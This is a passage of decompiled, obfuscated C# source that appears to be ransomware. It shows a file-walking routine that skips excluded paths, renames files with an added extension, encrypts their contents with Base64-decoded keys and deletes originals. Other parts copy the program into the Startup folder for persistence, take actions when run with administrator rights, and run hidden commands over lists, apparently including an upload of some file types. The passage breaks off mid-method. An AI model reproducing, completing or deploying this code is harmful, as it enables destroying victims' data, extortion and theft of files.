			IotoyMkpqvvqDZe CS_0024_003C_003E8__locals0 = new IotoyMkpqvvqDZe();
			CS_0024_003C_003E8__locals0.hdfjPBCWXrpm = this;
			CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx = string_0;
			if (((!CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388868)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388843)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388298)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388249)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388268)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388211)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388222)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388177)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388196)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388159)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388118)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388133)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388107)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388054))) || CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(jPRGqhYdKzNWs(getString_0(107388061)))) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388500)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388515)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388466)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388481)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388432)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388447)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388398)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388413)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388368)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107388347)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388334)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388353)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388304)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().Contains(getString_0(107388319)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(jPRGqhYdKzNWs(getString_0(107387758))) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107387733)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107387752)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107396287)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107387707)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(lnskrEIqNRqxPQs) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(getString_0(107387714)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(getString_0(107387709)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(getString_0(107387672)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(getString_0(107387667)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(getString_0(107387662)) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(yVwPEJFmibAZK) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(CJWDXdtMlfSYp) && !CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.Contains(VLIXjNPLrckApD))
			{
				if (rzGfvbLcdyGbE.Length != 0)
				{
					string[] array = rzGfvbLcdyGbE;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1055;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.EndsWith(lnskrEIqNRqxPQs))
					{
						goto IL_1055;
					}
				}
				catch (Exception)
				{
					goto IL_1055;
				}
				if (!rIFldVBsKLex.Contains(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx))
				{
					if (KBtpeelEiWZuxq == getString_0(107396839))
					{
						try
						{
							if (LQFJNYySgreoXH.ZXqazdzrWuEoK(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx))
							{
								LQFJNYySgreoXH.JDPsRwBlMXAQgL(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
							}
						}
						catch
						{
						}
					}
					rIFldVBsKLex.Add(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (oGWxQvtPLxTata)
							{
								Console.WriteLine(IotoyMkpqvvqDZe.getString_0(107412261) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + IotoyMkpqvvqDZe.getString_0(107412670) + new FileInfo(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx).Length + IotoyMkpqvvqDZe.getString_0(107412681));
								Console.WriteLine(IotoyMkpqvvqDZe.getString_0(107412268), rIFldVBsKLex.Count, AOxElPxfgdJ, jlTbuRFtzeuGOi);
								Console.WriteLine(IotoyMkpqvvqDZe.getString_0(107412211), pgcRoGyexW.Elapsed);
								Console.WriteLine(IotoyMkpqvvqDZe.getString_0(107412640));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!tCYvoiODTAqS.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx)))
					{
						tCYvoiODTAqS.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx));
					}
					HoylbjiqYR(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
					try
					{
						new RJcskyZFMlSio().FmxkExlpiaLUbQn(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (oGWxQvtPLxTata)
								{
									Console.WriteLine(getString_0(107412737) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + getString_0(107412660) + new FileInfo(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx).Length + getString_0(107412671));
									Console.WriteLine(getString_0(107412630));
								}
							}
							catch
							{
							}
							cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107413037)), getString_0(107387578) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + getString_0(107387578) + jPRGqhYdKzNWs(getString_0(107413012)) + getString_0(107387578) + Environment.UserName + getString_0(107387578) + jPRGqhYdKzNWs(getString_0(107413027)));
						}
					}
					catch (Exception ex2)
					{
						if (iJiZVjbYIelgdjs)
						{
							try
							{
								File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387350) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + getString_0(107413002) + ex2.Message + getString_0(107395734));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx).Length != 0L)
							{
								goto end_IL_089f;
							}
							goto end_IL_089e;
							end_IL_089f:;
						}
						catch (Exception ex2)
						{
							if (iJiZVjbYIelgdjs)
							{
								try
								{
									File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387350) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + getString_0(107412889) + ex2.Message + getString_0(107395734));
								}
								catch (Exception)
								{
								}
							}
							jlTbuRFtzeuGOi++;
							goto end_IL_089e;
						}
						if (tRxOjxLQIVi == getString_0(107396839) && new FileInfo(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx).Length > Convert.ToInt32(BDeugxVDNkK) * 1024 * 1024)
						{
							try
							{
								if (lnskrEIqNRqxPQs != getString_0(107386583))
								{
									if (mVHEjGEVbs)
									{
										lnskrEIqNRqxPQs = zDWzXsHkfaAHYk + lnskrEIqNRqxPQs;
									}
									File.Move(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + lnskrEIqNRqxPQs);
								}
							}
							catch (Exception ex2)
							{
								if (iJiZVjbYIelgdjs)
								{
									try
									{
										File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387350) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + getString_0(107412316) + ex2.Message + getString_0(107395734));
									}
									catch (Exception)
									{
									}
								}
								jlTbuRFtzeuGOi++;
								return;
							}
							if (lnskrEIqNRqxPQs != getString_0(107386583))
							{
								CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx += lnskrEIqNRqxPQs;
							}
							if (hCeAnCNkuBouGp == getString_0(107396839))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string wMwztsmasQzPlm in WMwztsmasQzPlms)
									{
										if (CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().EndsWith(wMwztsmasQzPlm + CS_0024_003C_003E8__locals0.hdfjPBCWXrpm.lnskrEIqNRqxPQs) && NuNXfGMelkyJH == IotoyMkpqvvqDZe.getString_0(107396849))
										{
											if (Convert.ToInt32(xTfHhQvYRPop) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx).Length)
											{
												try
												{
													tHlEcNRvGaVVN.LwYCJufplFzw(IotoyMkpqvvqDZe.getString_0(107389133), IotoyMkpqvvqDZe.getString_0(107389128), IotoyMkpqvvqDZe.getString_0(107389083), CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx.ToLower().EndsWith(wMwztsmasQzPlm) && NuNXfGMelkyJH == IotoyMkpqvvqDZe.getString_0(107396648))
										{
											try
											{
												tHlEcNRvGaVVN.LwYCJufplFzw(IotoyMkpqvvqDZe.getString_0(107389133), IotoyMkpqvvqDZe.getString_0(107389128), IotoyMkpqvvqDZe.getString_0(107389083), CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(lYLvwKXVot);
							if (msoqVvcNnNic == getString_0(107396638))
							{
								byte[] array2 = null;
								byte[] byte_ = ILCPTbEyPImvS.hUdUxAsVxYJrsJYB(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, Convert.ToInt32(BDeugxVDNkK) * 1024 * 1024);
								if (!ILCPTbEyPImvS.trQfhmTmPgoc(opGohBOiRlt: (!XCsezoZWotlJ) ? (ldSVapxVzrqD ? ILCPTbEyPImvS.oTLflFQwfxprG(byte_, Convert.FromBase64String(NsSmeXJHTmoYqwKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ILCPTbEyPImvS.oTLflFQwfxprG(byte_, Convert.FromBase64String(NsSmeXJHTmoYqwKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (ldSVapxVzrqD ? xdhcRNHRhIrdsES.rIPxguvEmEeCvU(byte_, Convert.FromBase64String(NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn)) : xdhcRNHRhIrdsES.rIPxguvEmEeCvU(byte_, Convert.FromBase64String(NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn))), eVaQLrRtqDcN: CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, aiPzWzsMyTl: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!ldSVapxVzrqD)
							{
								if (!fzmxMDmmyWAvX.FptNnshurU(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, BDeugxVDNkK, NsSmeXJHTmoYqwKN, null, Convert.FromBase64String(ndmvemzTqn)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!fzmxMDmmyWAvX.FptNnshurU(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, BDeugxVDNkK, NsSmeXJHTmoYqwKN, bytes, Convert.FromBase64String(ndmvemzTqn)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (mVHEjGEVbs)
							{
								lnskrEIqNRqxPQs = zDWzXsHkfaAHYk + lnskrEIqNRqxPQs;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(lYLvwKXVot);
							if (lnskrEIqNRqxPQs != getString_0(107386583))
							{
								if (!AtuUAtLJmhINGx)
								{
									if (!ldSVapxVzrqD)
									{
										gGrpQJiClzFyZ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, QbfcPqWZFoPC);
									}
									else
									{
										gGrpQJiClzFyZ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, Convert.FromBase64String(NsSmeXJHTmoYqwKN));
									}
								}
								else
								{
									try
									{
										if (!ldSVapxVzrqD)
										{
											PSWanipCZcsCQ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, QbfcPqWZFoPC, Convert.FromBase64String(ndmvemzTqn));
										}
										else
										{
											PSWanipCZcsCQ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, Convert.FromBase64String(NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn));
										}
									}
									catch (Exception ex2)
									{
										if (iJiZVjbYIelgdjs)
										{
											try
											{
												File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387350) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + getString_0(107386601) + ex2.Message + getString_0(107395734));
											}
											catch (Exception)
											{
											}
										}
										jlTbuRFtzeuGOi++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!AtuUAtLJmhINGx)
							{
								if (!ldSVapxVzrqD)
								{
									gGrpQJiClzFyZ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + getString_0(107386578), QbfcPqWZFoPC);
								}
								else
								{
									gGrpQJiClzFyZ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + getString_0(107386578), Convert.FromBase64String(NsSmeXJHTmoYqwKN));
								}
							}
							else
							{
								try
								{
									if (!ldSVapxVzrqD)
									{
										PSWanipCZcsCQ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, QbfcPqWZFoPC, Convert.FromBase64String(ndmvemzTqn));
									}
									else
									{
										PSWanipCZcsCQ(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, Convert.FromBase64String(NsSmeXJHTmoYqwKN), Convert.FromBase64String(ndmvemzTqn));
									}
								}
								catch (Exception ex2)
								{
									if (iJiZVjbYIelgdjs)
									{
										try
										{
											File.AppendAllText(CJWDXdtMlfSYp, getString_0(107387350) + CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + getString_0(107386601) + ex2.Message + getString_0(107395734));
										}
										catch (Exception)
										{
										}
									}
									jlTbuRFtzeuGOi++;
									return;
								}
							}
							if (ldSVapxVzrqD)
							{
								if (lnskrEIqNRqxPQs != getString_0(107386583))
								{
									PmedSpBSzBvBRlc(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx + lnskrEIqNRqxPQs, bytes);
								}
								else
								{
									PmedSpBSzBvBRlc(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx, bytes);
								}
							}
						}
						end_IL_089e:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1055;
			IL_1055:
			MRBsiJVrGpV.Remove(CS_0024_003C_003E8__locals0.dRnSJbMHcOFBx);
		}

		static UMXNmMotuFVr()
		{
			Strings.CreateGetStringDelegate(typeof(UMXNmMotuFVr));
		}
	}

	private sealed class euHCglGVvrGc
	{
		public string fkWbnCCVseo;

		public string DLDgEOWqaSnubBF;

		public void _003CEncrypt2_003Eb__4b()
		{
			while (true)
			{
				try
				{
					File.Delete(fkWbnCCVseo);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__4c()
		{
			while (true)
			{
				try
				{
					if (File.Exists(DLDgEOWqaSnubBF))
					{
						File.Delete(DLDgEOWqaSnubBF);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string oWHQHJfsyNioFvF;

	public static byte[] QbfcPqWZFoPC;

	public static string nLzLTpABeRNVVq;

	public static string hlKQtNLDuwX;

	public static List<string> RREAXVcGCyFW;

	public static List<string> pJNYtmUhPRnWd;

	public static string GiFkNGgoeUmR;

	public static string NsSmeXJHTmoYqwKN;

	public static string ndmvemzTqn;

	public static string lYLvwKXVot;

	public static string yyUbJQLyaMc;

	public static int OmILzYUZMtfA;

	public static string KBtpeelEiWZuxq;

	public static string FjIjlBoryod;

	public static string ozHrrguPqrKLX;

	public static string gLRyPbhpEhtV;

	public static string ozCbyDrITcAQP;

	public static string YccnjRUGmPaVvYxSUL;

	public static string BWhgdETaJVCX;

	public static string qqiiQuXknD;

	public static List<string> JWJCGvFLzMG;

	public static List<string> tCYvoiODTAqS;

	public static string myDCltnChvy;

	public static string Uxtbyuiilbwc;

	public static string GSgQYhmcripq;

	public static List<string> rIFldVBsKLex;

	public static string NgFxRivWtQo;

	private static string CkoHMbfQgoU;

	public static string xkNXdReJgqdr;

	public static string TdqWNQlRrVSrjYC;

	public static List<string> IrZYiWnxBrD;

	public static List<string> uPUuCQFvbMI;

	public static List<string> YCIKPmfZtuIbUFAlB;

	public static string IaFrllmnGTUgy;

	public static List<string> OoMyfWWolleKv;

	public static List<string> bbzLZDIlwi;

	public static string nCFoyyEfqMoXVXwj;

	public static string JxKfMYSDzyz;

	internal static DateTime PysxgjOhENWN;

	internal static DateTime iIsBJdTdnKl;

	public static string tRxOjxLQIVi;

	public static string BDeugxVDNkK;

	public static string xNacrcDdcyMpcHAi;

	public static string SAADKWeCESrVxh;

	public static string WXJgWffuwXd;

	public static string vSvPIxrDMp;

	public static string bHHzxslVgWZLK;

	public static string hCeAnCNkuBouGp;

	public static List<string> WMwztsmasQzPlms;

	public static string NuNXfGMelkyJH;

	public static string xTfHhQvYRPop;

	public static string ZgEiKGRvnhAsc;

	public static string uVMjIBAQKTtmEg;

	public static string DZHocsiPMmkPfZ;

	public static string WocDbkOwDbogol;

	public static string wiOAgZvALBbKd;

	public static string JJEqXdEhsZwI;

	public static string xYpLCAVgyBOj;

	public static string UlVSLsCncbMdhGO;

	public static string uvZdOBpqtfGE;

	public static string YevLoBoZIU;

	public static string rgPcaXsDNBQ;

	public static string eVxuVysgKWK;

	public static string BuOOARqhNph;

	public static string WAuNiYEeWuQE;

	public static string WRIJIYrfMdFFYO;

	public static string pLmfoZoOmDPaZ;

	public static string IgbuSWVjBYK;

	public static string yVwPEJFmibAZK;

	public static string fgVaHjGsjcVVT;

	public static string FjmNRIeDCCCMPGH;

	public static string ezwxvYAfqF;

	public static string OfibXUnjypMZ;

	public static string hvGepLoFGYytPmQoB;

	public static string LMYEaEKRBhrmZ;

	public static string msoqVvcNnNic;

	public static string IHWduAvsEvfi;

	public static string wCjobMKomWZ;

	public static string[] FYNjTuxrmMLYd;

	public static string GUenUfjFQXZm;

	public static bool XCsezoZWotlJ;

	public static string tlbyuCUJmYbILB;

	public static bool ldSVapxVzrqD;

	public static bool ljOcDCDdQqE;

	public static bool AmXJmjSSpzM;

	public static bool UJmSBWsTWhUWfFO;

	public static string CJWDXdtMlfSYp;

	public static bool iJiZVjbYIelgdjs;

	public static bool PFYXYEyErhC;

	public static bool BbIbxCUpjhdp;

	public static bool AfVRFSOzqdcuiaP;

	public static bool AtuUAtLJmhINGx;

	public static string VLIXjNPLrckApD;

	public static bool oGWxQvtPLxTata;

	public static Stopwatch pgcRoGyexW;

	public static int jlTbuRFtzeuGOi;

	public static int AOxElPxfgdJ;

	public static bool mVHEjGEVbs;

	public static string zDWzXsHkfaAHYk;

	public static string[] HTAXVkquFAX;

	public static List<string> woareyDOrgQIBeNF;

	public static int OJyevihVUiZpn;

	public static bool yKfQtEFbRGh;

	public static bool kYDltoULChd;

	public static bool zcUPsmvQPTXgnTL;

	public static bool QgtapIBydwyYG;

	public static bool SnRSscbMrPPgbx;

	public static bool IbDKTAofqidR;

	public static List<string> CUzJiAbMAitn;

	public static string bfYXiuTlOhZZ;

	public static bool WcDXYQEnYXB;

	public static byte[] vkIdOMxYDQuiM;

	public static byte[] odSXvXhnBEMCo;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate18;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		try
		{
			wBzlthIsHYq CS_0024_003C_003E8__locals0 = new wBzlthIsHYq();
			CS_0024_003C_003E8__locals0.JmhoIVQmAhECyC = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.JmhoIVQmAhECyC) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			GXvqNspathMVC.hwibzBrJqdySS(CkoHMbfQgoU);
		}
		catch (Exception)
		{
		}
		try
		{
			if (LMYEaEKRBhrmZ == getString_0(107396821))
			{
				Thread thread = new Thread(hOJvzprMrXO.GYnEVqnbWgkiw);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (ozHrrguPqrKLX == getString_0(107396821))
		{
			Thread.Sleep(int.Parse(gLRyPbhpEhtV));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && bHHzxslVgWZLK == getString_0(107396821))
		{
			try
			{
				gUHzNnhzYpz(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107396816))));
			}
			catch
			{
			}
		}
		try
		{
			if (BWhgdETaJVCX == getString_0(107396821) && FOVSuDJCJCqb.DInBXojObQqwmq())
			{
				new UQolrMmPyk().vKoaGyOgRXWde(bool_0: false);
				FOVSuDJCJCqb.gbczltBIWaiDhHj();
			}
		}
		catch (Exception)
		{
		}
		if (Uxtbyuiilbwc == getString_0(107396821) && FOVSuDJCJCqb.DInBXojObQqwmq())
		{
			new UQolrMmPyk().vKoaGyOgRXWde(bool_0: false);
			new UQolrMmPyk().XEFRTofdocNy();
		}
		if (FjIjlBoryod == getString_0(107396821))
		{
			ujCJqLdxCrC.szmtwNlkzjrCowS();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397191);
			string text2 = text + Path.GetFileName(fileName);
			if (yyUbJQLyaMc == getString_0(107396821) && fileName != text2)
			{
				Thread thread2 = new Thread(qRYbfbCMiykYGG);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (GiFkNGgoeUmR == getString_0(107396821) && mainModule != null && fileName != text2)
			{
				try
				{
					OmILzYUZMtfA = poeEcMgeJQALjSao(0, JWJCGvFLzMG.Count);
					File.Copy(fileName, text + JWJCGvFLzMG[OmILzYUZMtfA], overwrite: true);
					getString_0(107397186);
					Process.Start(text + JWJCGvFLzMG[OmILzYUZMtfA]);
					MXWEDjfPHhhXM();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (nCFoyyEfqMoXVXwj == getString_0(107396821) && DateTime.Now < PysxgjOhENWN)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (JxKfMYSDzyz == getString_0(107396821) && DateTime.Now > iIsBJdTdnKl)
			{
				MXWEDjfPHhhXM();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = getString_0(107396416);
			if (rgPcaXsDNBQ == getString_0(107396821))
			{
				Console.WriteLine(getString_0(107396310));
			}
			pgcRoGyexW.Start();
		}
		catch
		{
		}
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> irZYiWnxBrD = IrZYiWnxBrD;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386985)), string_0);
					};
				}
				Parallel.ForEach(irZYiWnxBrD, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				List<string> source = uPUuCQFvbMI;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386972)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				if (wCjobMKomWZ == getString_0(107396821))
				{
					string[] fYNjTuxrmMLYd = FYNjTuxrmMLYd;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
						{
							cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386972)), getString_0(107386947) + string_0 + getString_0(107386970));
						};
					}
					Parallel.ForEach(fYNjTuxrmMLYd, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				if (!hhcgraCrPsmCioL().Contains(getString_0(107389018)))
				{
					try
					{
						DjPMEMdbQtZKb(IaFrllmnGTUgy);
					}
					catch (Exception)
					{
					}
					List<string> yCIKPmfZtuIbUFAlB3 = YCIKPmfZtuIbUFAlB;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
						{
							cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107386498))), string_0);
						};
					}
					Parallel.ForEach(yCIKPmfZtuIbUFAlB3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				}
				else
				{
					List<string> yCIKPmfZtuIbUFAlB4 = YCIKPmfZtuIbUFAlB;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
					{
